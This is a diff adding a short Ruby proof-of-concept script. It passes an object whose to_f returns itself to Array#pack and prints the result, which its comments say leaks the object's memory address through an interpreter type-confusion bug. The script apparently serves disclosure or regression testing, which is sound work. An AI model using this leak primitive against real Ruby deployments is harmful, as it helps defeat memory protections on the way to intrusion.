@@ -1,0 +1,15 @@
+class Vuln
+	def to_f
+		self
+	end
+end 
+
+obj = Vuln.new
+arr = [4.0,2,3]
+arr[0]=obj
+#print the object address for our reference 
+print obj
+print "\n"
+#leak the object address 
+print arr.pack("G").unpack("H*")
+print "\n"
